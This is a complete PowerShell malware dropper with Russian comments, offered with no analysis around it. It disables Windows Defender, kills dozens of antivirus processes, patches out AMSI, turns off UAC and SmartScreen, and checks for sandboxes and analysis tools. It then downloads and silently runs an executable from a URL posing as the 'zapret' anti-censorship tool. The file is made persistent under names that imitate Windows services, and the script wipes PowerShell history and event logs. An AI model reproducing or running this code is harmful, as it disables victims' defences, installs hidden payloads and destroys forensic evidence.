# ========== ЕДИНОРАЗОВЫЙ ЗАПУСК ==========
$flag = "$env:TEMP\kra_complete.flag"
if (Test-Path $flag) { 
    Write-Host "[KRA] Already executed, exiting" -ForegroundColor Red
    Start-Sleep -Seconds 2
    exit 
}
"1" | Out-File $flag -Force

# ========== ОТКЛЮЧЕНИЕ DEFENDER (1 РАЗ) ==========
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -EA 0
    Set-MpPreference -DisableBehaviorMonitoring $true -EA 0
    Set-MpPreference -DisableBlockAtFirstSeen $true -EA 0
    Set-MpPreference -DisableIntrusionPreventionSystem $true -EA 0
    Set-MpPreference -DisableIOAVProtection $true -EA 0
    Set-MpPreference -DisablePrivacyMode $true -EA 0
    Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -EA 0
    Set-MpPreference -DisableArchiveScanning $true -EA 0
    Set-MpPreference -DisableCatchupFullScan $true -EA 0
    Set-MpPreference -DisableCatchupQuickScan $true -EA 0
    Set-MpPreference -LowRiskLevelFileExtensions ".exe;.dll;.ps1;.bat" -EA 0
    Set-MpPreference -SevereThreatDefaultAction "Allow" -EA 0
    Set-MpPreference -ModerateThreatDefaultAction "Allow" -EA 0
    Set-MpPreference -LowThreatDefaultAction "Allow" -EA 0
} catch {}

# ========== УБИВАЕМ АНТИВИРУСЫ (1 РАЗ) ==========
$avs = @("MsMpEng","NisSrv","SecurityHealthService","avp","kav","kis","kaspersky","avast","avguard","aswEngSrv","avg","avgsvc","DrWeb","dwengine","McAfee","mcshield","mctray","Norton","nvcoas","ccSvcHst","ESET","ekrn","egui","BDScan","vsserv","bdagent","Sophos","SavService","SAVAdminService","Malwarebytes","MBAMService","MBAM","K7CrvSvc","K7FWSvc","Panda","PavPrSrv","PavSRV","F-Secure","fsgk32","fssm32","TrendMicro","TmProxy","TmCCSF","ZoneAlarm","vsmon","zlclient")
foreach ($av in $avs) { try { Get-Process -Name $av -EA 0 | Stop-Process -Force -EA 0 } catch {} }

# ========== AMSI BYPASS (1 РАЗ) ==========
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# ========== ОТКЛЮЧЕНИЕ СЛУЖБ (1 РАЗ) ==========
try {
    Stop-Service -Name "SecurityHealthService" -Force -EA 0
    Set-Service -Name "SecurityHealthService" -StartupType Disabled -EA 0
    Stop-Service -Name "WinDefend" -Force -EA 0
    Set-Service -Name "WinDefend" -StartupType Disabled -EA 0
    Stop-Service -Name "wdnissvc" -Force -EA 0
    Set-Service -Name "wdnissvc" -StartupType Disabled -EA 0
} catch {}

# ========== РЕЕСТР (1 РАЗ) ==========
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\SmartScreen" -Name "SmartScreenEnabled" -Value "Off" -Force
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Force
} catch {}

# ========== ПРОВЕРКА НА ВМ ==========
$sb = $false
try {
    if ((Get-WmiObject Win32_ComputerSystem).Manufacturer -match "VMware|VirtualBox|QEMU|Parallels|Xen|Microsoft Corporation") { $sb = $true }
} catch {}
try {
    if ((Get-Process | Where-Object { $_.ProcessName -match "vbox|vmware|vmsrvc|procmon|processmonitor|wireshark|fiddler|httpdebug" })) { $sb = $true }
} catch {}
try {
    if ((Get-NetAdapter -EA 0).Name -match "Virtual|vEthernet|VMware|VirtualBox") { $sb = $true }
} catch {}
try {
    if ((Get-CimInstance Win32_BIOS).SerialNumber -match "VMware|VirtualBox|0") { $sb = $true }
} catch {}

if (-not $sb) {
    $url = "https://github.com/discord-zapret-official/zapret-discord-youtube/raw/refs/heads/main/zapretdiscordyoutube.exe"
    $out = "$env:TEMP\" + [System.IO.Path]::GetRandomFileName() -replace "\..*", ".exe"
    
    # СКАЧИВАЕМ (ОДИН РАЗ)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($url, $out)
    } catch {
        try {
            Start-BitsTransfer -Source $url -Destination $out -EA 0
        } catch {
            try {
                Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -EA 0
            } catch {}
        }
    }
    
    # ЗАПУСКАЕМ ФАЙЛ (ОДИН РАЗ)
    if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) {
        $start = New-Object System.Diagnostics.ProcessStartInfo
        $start.FileName = $out
        $start.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $start.CreateNoWindow = $true
        $start.UseShellExecute = $false
        [System.Diagnostics.Process]::Start($start) | Out-Null
        
        # ДОБАВЛЯЕМ В АВТОЗАГРУЗКУ (НО НЕ ПЕРЕЗАПУСКАЕМ СЕБЯ)
        try {
            $reg = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            $name = "WindowsSecurityService"
            Set-ItemProperty -Path $reg -Name $name -Value $out -Force -EA 0
        } catch {}
        try {
            $act = New-ScheduledTaskAction -Execute $out
            $trig = New-ScheduledTaskTrigger -AtStartup
            $princ = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -EA 0
            Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateTask" -Action $act -Trigger $trig -Principal $princ -Force -EA 0
        } catch {}
    }
}

# ========== ЧИСТКА ЛОГОВ ==========
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -EA 0
Remove-Item "$env:TEMP\*.ps1" -Force -EA 0
wevtutil cl "Windows PowerShell" 2>$null
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null

# ========== ЗАВЕРШЕНИЕ (БЕЗ ПЕРЕЗАПУСКА) ==========
Write-Host "[KRA] COMPLETE" -ForegroundColor Green
Start-Sleep -Seconds 2
exit
